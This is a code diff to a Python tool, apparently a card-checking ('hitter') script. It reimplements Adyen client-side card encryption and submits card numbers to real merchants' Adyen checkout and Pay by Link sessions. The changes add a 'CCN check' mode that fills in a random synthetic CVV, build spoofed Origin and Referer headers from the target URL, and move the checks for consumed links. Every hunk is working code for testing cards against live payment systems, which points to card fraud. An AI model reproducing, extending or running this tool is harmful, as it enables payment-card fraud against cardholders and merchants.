@@ -56,7 +56,10 @@ class AdyenCSE:
         ps_len = key_len - len(message) - 3
         if ps_len < 8:
             raise ValueError("Message too long for RSA key")
-        ps = bytes([b for b in os.urandom(ps_len + 16) if b != 0][:ps_len])
+        ps = b""
+        while len(ps) < ps_len:
+            ps += bytes(b for b in os.urandom(ps_len) if b != 0)
+        ps = ps[:ps_len]
         em = b"\x00\x02" + ps + b"\x00" + message
         m_int = int.from_bytes(em, "big")
         c_int = pow(m_int, self._exp, self._mod)
@@ -96,14 +99,11 @@ class AdyenCSE:
             "encryptedSecurityCode":   self._encrypt_field("cvc",         cvv),
         }
 
-    def encrypt_card_ccn(self, number: str, month: str, year: str) -> dict:
-        """Encrypt card for CCN check — number + expiry only, no CVV."""
-        yr = year if len(year) == 4 else f"20{year}"
-        return {
-            "encryptedCardNumber":     self._encrypt_field("number",      number),
-            "encryptedExpiryMonth":    self._encrypt_field("expiryMonth", month.zfill(2)),
-            "encryptedExpiryYear":     self._encrypt_field("expiryYear",  yr),
-        }
+    def encrypt_card_ccn(self, number: str, month: str, year: str, cvv: Optional[str] = None) -> dict:
+        """Encrypt card for CCN check — auto-attaches synthetic CVV if omitted."""
+        if not cvv or cvv == '000':
+            cvv = f"{random.randint(1000, 9999):04d}" if str(number).startswith(('34', '37')) else f"{random.randint(100, 999):03d}"
+        return self.encrypt_card(number, month, year, cvv)
 
 
 # ═══════════════════════════════════════════════════════════════════════════
@@ -191,7 +191,7 @@ def _detect_brand(card_num: Optional[str]) -> str:
         return 'amex'
     elif cn.startswith(('6011', '65', '644', '645')):
         return 'discover'
-    elif cn.startswith(('3528', '3589', '35')):
+    elif len(cn) >= 4 and '3528' <= cn[:4] <= '3589':
         return 'jcb'
     return 'scheme'
 
@@ -292,6 +292,14 @@ class AdyenHitter:
             self.url = f"https://{self.url}"
         self.proxy_data = proxy_data
 
+    def _get_origin(self) -> str:
+        parsed = urlparse(self.url)
+        if parsed.netloc:
+            return f"{parsed.scheme or 'https'}://{parsed.netloc}"
+        if 'adyen.link' in self.url:
+            return "https://eu.adyen.link"
+        return self.url
+
     def _adyen_base(self, env: str) -> str:
         return f"https://checkoutshopper-{env or 'live'}.adyen.com/checkoutshopper"
 
@@ -317,17 +325,19 @@ class AdyenHitter:
             f"{base}/session/paybylink/v1/{link_id}/setup"
             f"?d={link_id}&generateSessionData=true&generateCheckoutAttemptId=true"
         )
+        origin = self._get_origin()
         hdr = {
             "Accept": "application/json",
             "User-Agent": UA,
-            "Origin": "https://eu.adyen.link",
-            "Referer": f"https://eu.adyen.link/{link_id}"
+            "Origin": origin,
+            "Referer": self.url
         }
         out = {}
         try:
             async with session.get(setup_url, headers=hdr, timeout=12) as r:
                 d = r.json() if callable(r.json) else r.json
                 if not isinstance(d, dict):
+                    out['error'] = 'Invalid setup response from Adyen'
                     return out
 
                 out['sessionId']   = d.get('sessionId')
@@ -358,8 +368,8 @@ class AdyenHitter:
                 out['is_pbl']   = True
                 out['linkId']   = link_id
                 out['pbl_base'] = base
-        except Exception:
-            pass
+        except Exception as e:
+            out['error'] = f"PBL setup error: {str(e)[:80]}"
         return out
 
     # ── page scrape ─────────────────────────────────────────────────────────
@@ -441,11 +451,9 @@ class AdyenHitter:
 
     async def _pay_session(self, session, encrypted: dict,
                            sid: str, sdata: str, ck: str,
-                           env: str, att_id: Optional[str] = None,
-                           card_num: Optional[str] = None,
-                           ccn_mode: bool = False) -> dict:
+                           env: str, att_id: Optional[str] = None) -> dict:
         url = f"{self._adyen_base(env)}/v1/sessions/{sid}/payments?clientKey={ck}"
-        origin = "https://eu.adyen.link" if 'adyen.link' in self.url else self.url
+        origin = self._get_origin()
         
         pm = {"type": "scheme", **encrypted}
 
@@ -476,7 +484,7 @@ class AdyenHitter:
                                ck: str, env: str, details: dict) -> dict:
         """POST /v1/sessions/{sid}/paymentDetails with 3DS result."""
         url = f"{self._adyen_base(env)}/v1/sessions/{sid}/paymentDetails?clientKey={ck}"
-        origin = "https://eu.adyen.link" if 'adyen.link' in self.url else self.url
+        origin = self._get_origin()
         body = {
             "sessionData": sdata,
             "details": details,
@@ -945,6 +953,13 @@ class AdyenHitter:
                     result['response_time'] = round(time.time() - t0, 2)
                     return result
 
+                result['pbl_reusable'] = cfg.get('pbl_reusable', True)
+                if cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
+                    result['error'] = f"Pay by Link is {cfg['pbl_status']} (Already Consumed / Closed)"
+                    result['decline_code'] = 'link_' + str(cfg['pbl_status']).lower()
+                    result['response_time'] = round(time.time() - t0, 2)
+                    return result
+
                 ck = cfg.get('clientKey')
                 if not ck:
                     result['error'] = "Adyen detected but clientKey not found"
@@ -980,25 +995,15 @@ class AdyenHitter:
 
                 sid   = cfg.get('sessionId')
                 sdata = cfg.get('sessionData')
-                result['pbl_reusable'] = cfg.get('pbl_reusable', True)
-
-                if cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
-                    result['error'] = f"Pay by Link is {cfg['pbl_status']} (Already Consumed / Closed)"
-                    result['decline_code'] = 'link_' + str(cfg['pbl_status']).lower()
-                    result['response_time'] = round(time.time() - t0, 2)
-                    return result
 
                 if sid and sdata:
                     data = await self._pay_session(
                         sess, enc, sid, sdata, ck, env,
-                        att_id=cfg.get('checkoutAttemptId'),
-                        card_num=card.get('card'),
-                        ccn_mode=True)
+                        att_id=cfg.get('checkoutAttemptId'))
                 else:
                     data = await self._pay_direct(
                         sess, enc, ck, env,
-                        card_num=card.get('card'),
-                        ccn_mode=True)
+                        card_num=card.get('card'))
 
                 if not data:
                     result['error'] = "Adyen session missing — dynamic session required"
@@ -1065,6 +1070,13 @@ class AdyenHitter:
                     result['response_time'] = round(time.time() - t0, 2)
                     return result
 
+                result['pbl_reusable'] = cfg.get('pbl_reusable', True)
+                if cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
+                    result['error'] = f"Pay by Link is {cfg['pbl_status']} (Already Consumed / Closed)"
+                    result['decline_code'] = 'link_' + str(cfg['pbl_status']).lower()
+                    result['response_time'] = round(time.time() - t0, 2)
+                    return result
+
                 ck = cfg.get('clientKey')
                 if not ck:
                     result['error'] = "Adyen detected but clientKey not found"
@@ -1098,26 +1110,15 @@ class AdyenHitter:
                 # ── 4. submit ───────────────────────────────────────────────
                 sid   = cfg.get('sessionId')
                 sdata = cfg.get('sessionData')
-                result['pbl_reusable'] = cfg.get('pbl_reusable', True)
-
-                # Only block if sessionId and sessionData could not be generated AND link is explicitly inactive
-                if cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
-                    result['error'] = f"Pay by Link is {cfg['pbl_status']} (Already Consumed / Closed)"
-                    result['decline_code'] = 'link_' + str(cfg['pbl_status']).lower()
-                    result['response_time'] = round(time.time() - t0, 2)
-                    return result
 
                 if sid and sdata:
                     data = await self._pay_session(
                         sess, enc, sid, sdata, ck, env,
-                        att_id=cfg.get('checkoutAttemptId'),
-                        card_num=card.get('card'),
-                        ccn_mode=False)
+                        att_id=cfg.get('checkoutAttemptId'))
                 else:
                     data = await self._pay_direct(
                         sess, enc, ck, env,
-                        card_num=card.get('card'),
-                        ccn_mode=False)
+                        card_num=card.get('card'))
 
                 if not data:
                     result['error'] = "Adyen session missing — dynamic session required"
